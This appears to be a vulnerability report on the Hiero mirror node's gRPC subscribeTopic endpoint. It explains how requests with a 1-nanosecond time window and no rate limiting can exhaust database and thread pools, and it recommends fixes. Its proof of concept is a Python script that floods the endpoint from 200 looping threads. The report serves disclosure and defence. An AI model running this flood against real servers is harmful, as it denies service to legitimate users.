### Title
Unbounded gRPC Subscription Flood via Minimal Time-Window Requests Causes Resource Exhaustion

### Summary
The `toFilter()` method in `ConsensusController.java` accepts any `consensusEndTime` that is strictly greater than `consensusStartTime` by even 1 nanosecond. There is no rate limiting, no minimum window size, and no cap on total concurrent subscriptions on the gRPC endpoint. An unprivileged attacker can flood the server with rapid `subscribeTopic` calls using a 1-nanosecond time window, each triggering a full reactive chain allocation and a database query, exhausting the DB connection pool and scheduler thread pool.

### Finding Description

**Code path:**

`ConsensusController.subscribeTopic()` (line 44) calls `toFilter()` (line 55), which builds a `TopicMessageFilter` with the caller-supplied start/end times with no minimum-window enforcement:

```
grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java
lines 55–73
``` [1](#0-0) 

The only validation in `TopicMessageFilter` is:

```java
// TopicMessageFilter.java line 44-46
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
``` [2](#0-1) 

`endTime = startTime + 1` (nanosecond) satisfies `endTime > startTime`, so it passes. There is no minimum window size check.

**What happens per subscription in `TopicMessageServiceImpl.subscribeTopic()`:**

1. A `TopicContext` object is allocated (line 61).
2. A `historical` Flux is created, triggering a DB retrieval query (line 63).
3. A `live` Flux is deferred (line 64).
4. A `safetyCheck` Flux with a 1-second `Mono.delay` is scheduled on `Schedulers.boundedElastic()` (lines 67–70).
5. A `pastEndTime` polling Flux is created (line 73).
6. `subscriberCount` is incremented then decremented (lines 89–90). [3](#0-2) 

Even though `TopicContext.isComplete()` returns `true` immediately when `filter.getEndTime() < topicContext.startTime` (i.e., the window is entirely in the past), the full reactive chain — including the DB query — is assembled and executed before completion is detected: [4](#0-3) 

**Missing protection:** The only per-connection limit is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`. There is no cap on total connections, no per-IP rate limit, and no gRPC-layer throttle (the `ThrottleConfiguration` with Bucket4j exists only in the `web3` module, not in `grpc`): [5](#0-4) 

### Impact Explanation

Each crafted request forces: one DB query against the `topic_message` table, allocation of multiple Reactor `Flux`/`Mono` objects, and a scheduled task on the bounded-elastic thread pool. With no rate limiting, an attacker opening N connections (each with 5 concurrent calls) can sustain N×5 simultaneous DB queries. At sufficient volume this exhausts the DB connection pool, starves the `boundedElastic` scheduler, and degrades or denies service to all legitimate subscribers of the mirror node's HCS gRPC API — a critical data-access path for Hedera ecosystem applications.

### Likelihood Explanation

No authentication or API key is required to call `subscribeTopic`. The gRPC endpoint is publicly exposed (port 5600 per the Helm chart). The attack requires only a standard gRPC client library and the ability to open multiple TCP connections. The crafted request is trivially constructed: set `consensusStartTime` to any past epoch, set `consensusEndTime` to `consensusStartTime + 1 nanosecond`. This is fully repeatable and automatable.

### Recommendation

1. **Enforce a minimum time window**: In `TopicMessageFilter.isValidEndTime()`, require `endTime > startTime + MINIMUM_WINDOW_NS` (e.g., 1 second = 1,000,000,000 ns).
2. **Add a global concurrent-subscription cap**: Reject new subscriptions when `subscriberCount` exceeds a configurable maximum.
3. **Add per-IP or per-connection rate limiting** at the gRPC interceptor layer, analogous to the Bucket4j throttle already present in the `web3` module.
4. **Add a minimum `endTime` distance from `now`**: Reject requests whose `endTime` is already in the past at the time of the call, since they can only produce a single bounded DB scan with no live streaming value.

### Proof of Concept

```python
import grpc
from hedera import consensus_service_pb2_grpc, consensus_topic_query_pb2
from google.protobuf.timestamp_pb2 import Timestamp

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)

# T = some past epoch (e.g., 1000 seconds after Unix epoch)
start = Timestamp(seconds=1000, nanos=0)
end   = Timestamp(seconds=1000, nanos=1)   # exactly 1 ns after start

query = consensus_topic_query_pb2.ConsensusTopicQuery(
    topic_id=...,                  # any valid topic ID
    consensus_start_time=start,
    consensus_end_time=end,
)

# Flood: open many connections, 5 concurrent calls each
import threading
def flood():
    while True:
        try:
            list(stub.subscribeTopic(query))
        except:
            pass

for _ in range(200):
    threading.Thread(target=flood, daemon=True).start()
```

Each iteration passes `isValidEndTime()` (1 > 0), triggers a DB query for a 1 ns window, allocates the full reactive chain, and immediately completes — cycling resources at maximum rate with no server-side throttle.

    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```
